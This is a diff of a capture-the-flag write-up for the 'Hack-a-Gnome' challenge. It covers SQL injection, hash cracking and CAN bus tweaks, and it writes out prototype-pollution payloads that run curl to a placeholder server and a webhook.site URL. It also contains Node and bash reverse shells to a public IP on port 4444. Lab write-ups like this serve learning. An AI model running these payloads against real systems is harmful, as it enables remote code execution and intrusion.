@@ -18,14 +18,12 @@ nav: |
 <thead>
 <tr>
 <th>Objective: Hack-a-Gnome</th>
-<br>
 <th>Difficulty Level: 3</th>
 </tr>
 </thead>
 <tbody>
 <tr>
 <td>Davis in the Data Center is fighting a gnome army-join the hack-a-gnome fun.</td>
-<br>
 <td>Location: Data Center</td>
 </tr>
 </tbody>
@@ -39,67 +37,46 @@ Structure Query Language (SQL) injection was used to identify the database type,
 <thead>
 <tr>
 <th>Activity</th>
-<br>
 <th>Primary Tactic</th>
-<br>
 <th>MITRE ATT&CK Technique ID</th>
-<br>
 <th>MITRE ATT&CK Technique Name</th>
 </tr>
 </thead>
 <tbody>
 <tr>
 <td>Determine database type using SQL injection</td>
-<br>
 <td>Discovery</td>
-<br>
 <td>T1596.005</td>
-<br>
 <td>Application Layer Protocol: SQL</td>
 </tr>
 <tr>
 <td>Determine database structure using SQL injection</td>
-<br>
 <td>Discovery</td>
-<br>
 <td>T1596.005</td>
-<br>
 <td>Application Layer Protocol: SQL (used to enumerate schema, tables, columns)</td>
 </tr>
 <tr>
 <td>Determine usernames and password hashes using SQL injection</td>
-<br>
 <td>Credential Access</td>
-<br>
 <td>T1078 (Valid Accounts)</td>
-<br>
 <td>Credentials from Databases</td>
 </tr>
 <tr>
 <td>Crack password hashes</td>
-<br>
 <td>Credential Access</td>
-<br>
 <td>T1110.002</td>
-<br>
 <td>Password Cracking</td>
 </tr>
 <tr>
 <td>Remote code execution from prototype pollution</td>
-<br>
 <td>Execution</td>
-<br>
 <td>T1203</td>
-<br>
 <td>Exploitation for Client Execution</td>
 </tr>
 <tr>
 <td>Decode CAN bus signals</td>
-<br>
 <td>Discovery</td>
-<br>
 <td>T1595</td>
-<br>
 <td>Protocol Analysis</td>
 </tr>
 </tbody>
@@ -218,35 +195,24 @@ Prototype pollution is possible. Server Headers indicate “Express” which is 
 This is the payload:
 <br>
 <pre><code class="language-">
-<br>
 {
-<br>
   "action": "update",
-<br>
   "key": "__proto__",
-<br>
   "subkey": "outputFunctionName",
-<br>
   "value": "x;process.mainModule.require('child_process').execSync('curl http://YOUR-SERVER');s"
-<br>
 }
-<br>
 </code></pre>
 
 URL Encoded:
 <br>
 <pre><code class="language-">
-<br>
 message=%7B%22action%22%3A%22update%22%2C%22key%22%3A%22__proto__%22%2C%22subkey%22%3A%22outputFunctionName%22%2C%22value%22%3A%22x%3Bprocess.mainModule.require('child_process').execSync('curl%20http%3A%2F%2FYOUR-SERVER')%3Bs%22%7D
-<br>
 </code></pre>
 
 Payload that uses webhook.site as a sensor:
 
 <pre><code class="language-">
-<br>
 message=%7B%22action%22%3A%22update%22%2C%22key%22%3A%22__proto__%22%2C%22subkey%22%3A%22outputFunctionName%22%2C%22value%22%3A%22x%3Bprocess.mainModule.require('child_process').execSync('curl%20https%3A%2F%2Fwebhook.site%2Ff3bc21bc-b85f-4bb1-9bf2-bd4ac5767b96')%3Bs%22%7D
-<br>
 </code></pre>
 
 Webhook detects the connection:
@@ -256,19 +222,12 @@ Webhook detects the connection:
 Weaponizing with Node.JS reverse shell:
 <br>
 <pre><code class="language-">
-<br>
 {
-<br>
   "action": "update",
-<br>
   "key": "__proto__",
-<br>
   "subkey": "outputFunctionName",
-<br>
   "value": "x;require('child_process').exec('node -e \\'require(\"net\").connect({port:4444,host:\"173.255.237.30 \"},function(){this.pipe(require(\"child_process\").spawn(\"/bin/sh\",[]).stdin);require(\"child_process\").spawn(\"/bin/sh\",[]).stdout.pipe(this);})\\'');s"
-<br>
 }
-<br>
 </code></pre>
 
 Setup a linode linux system with a public IP and a listener on port 4444 to catch the shell.
@@ -276,9 +235,7 @@ Setup a linode linux system with a public IP and a listener on port 4444 to catc
 The message payload for the shell:
 <br>
 <pre><code class="language-">
-<br>
 message=%7B%22action%22%3A%22update%22%2C%22key%22%3A%22__proto__%22%2C%22subkey%22%3A%22outputFunctionName%22%2C%22value%22%3A%22x%3Bprocess.mainModule.require('child_process').execSync('bash%20-c%20%5C%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F173.255.237.30%2F4444%200%3E%261%5C%22')%3Bs%22%7D
-<br>
 </code></pre>
 
 <img src="/HHC_2025/images/hack-a-gnome_reverseshell.jpg" alt="Hack-a-Gnome Reverse Shell">
@@ -288,15 +245,10 @@ Once the payload is sent, trigger a refresh in the application to load the paylo
 The README.md shows that CAN IDs are grouped by type or purpose. 400 codes are requests, 300 codes are status. It is reasonable to assume that commands are a separate group, either 200 or 500 codes.Lets start with 200, and assume they are sequential. Let’s start with 200-204.  While the shell is active, it is not possible to get any feedback to commands. The process is to connect,  change the python file, disconnect, and then test.
 
 <pre><code class="language-sh">
-<br>
 sed -i 's/0x244/0x200/g' canbus_client.py   # up
-<br>
 sed -i 's/0x245/0x201/g' canbus_client.py   # down
-<br>
 sed -i 's/0x246/0x202/g' canbus_client.py   # left
-<br>
 sed -i 's/0x247/0x203/g' canbus_client.py   # right
-<br>
 </code></pre>
 
 Trial and error reveals the codes:
@@ -331,34 +283,28 @@ With control of the robot, boxes need to be moved so the power switch can be rea
 <thead>
 <tr>
 <th>Tools Used</th>
-<br>
 <th>Tool Version</th>
 </tr>
 </thead>
 <tbody>
 <tr>
 <td>crackstation.net</td>
-<br>
 <td>N/A</td>
 </tr>
 <tr>
 <td>Burp Suite Community Edition</td>
-<br>
 <td>v2024.11.2</td>
 </tr>
 <tr>
 <td>Claude.ai</td>
-<br>
 <td>4.5</td>
 </tr>
 <tr>
 <td>Linux Linode</td>
-<br>
 <td>System Ubuntu 24.04 LTS</td>
 </tr>
 <tr>
 <td>Webhook.net</td>
-<br>
 <td>N/A</td>
 </tr>
 </tbody>
@@ -369,44 +315,36 @@ With control of the robot, boxes need to be moved so the power switch can be rea
 <thead>
 <tr>
 <th>Provided By</th>
-<br>
 <th>Hint</th>
 </tr>
 </thead>
 <tbody>
 <tr>
 <td>Santa</td>
-<br>
 <td>Sometimes, client-side code can interfere with what you submit. Try proxying your requests through a tool like Burp Suite or OWASP ZAP. You might be able to trigger a revealing error message.</td>
 </tr>
 <tr>
 <td>Santa</td>
-<br>
 <td>Oh no, it sounds like the CAN bus controls are not sending the correct signals! If only there was a way to hack into your gnome's control stats/signal container to get command-line access to the smart-gnome. This would allow you to fix the signals and control the bot to shut down the factory. During my development of the robotic prototype, we found the factory's pollution to be undesirable, which is why we shut it down. If not updated since then, the gnome might be running on old and outdated packages.</td>
 </tr>
 <tr>
 <td>Santa</td>
-<br>
 <td>I actually helped design the software that controls the factory back when we used it to make toys. It's quite complex. After logging in, there is a front-end that proxies requests to two main components: a backend Statistics page, which uses a per-gnome container to render a template with your gnome's stats, and the UI, which connects to the camera feed and sends control signals to the factory, relaying them to your gnome (assuming the CAN bus controls are hooked up correctly). Be careful, the gnomes shutdown if you logout and also shutdown if they run out of their 2-hour battery life (which means you'd have to start all over again).</td>
 </tr>
 <tr>
 <td>Santa</td>
-<br>
 <td>There might be a way to check if an attribute IS_DEFINED on a given entry. This could allow you to brute-force possible attribute names for the target user's entry, which stores their password hash. Depending on the hash type, it might already be cracked and available online where you could find an online cracking station to break it.</td>
 </tr>
 <tr>
 <td>Santa</td>
-<br>
 <td>Once you determine the type of database the gnome control factory's login is using, look up its documentation on default document types and properties. This information could help you generate a list of common English first names to try in your attack.</td>
 </tr>
 <tr>
 <td>Santa</td>
-<br>
 <td>Nice! Once you have command-line access to the gnome, you'll need to fix the signals in the canbus_client.py file so they match up correctly. After that, the signals you send through the web UI to the factory should properly control the smart-gnome. You could try sniffing CAN bus traffic, enumerating signals based on any documentation you find, or brute-forcing combinations until you discover the right signals to control the gnome from the web UI.</td>
 </tr>
 <tr>
 <td>Chris</td>
-<br>
 <td>Hey, I could really use another set of eyes on this gnome takeover situation. Their systems have multiple layers of protection now - database authentication, web application vulnerabilities, and more! But every system has weaknesses if you know where to look. Ready to help me turn one of these rebellious bots against its own kind?</td>
 </tr>
 </tbody>
@@ -417,14 +355,12 @@ With control of the robot, boxes need to be moved so the power switch can be rea
 <thead>
 <tr>
 <th>Provided By</th>
-<br>
 <th>Notes</th>
 </tr>
 </thead>
 <tbody>
 <tr>
 <td>fluffme</td>
-<br>
 <td>Gave me clues about using server side java for prototype pollution. Suggested using Webhook and Linode for testing connections and then establishing them. This allowed me to solve the challenge without changing my machine's security posture.</td>
 </tr>
 </tbody>
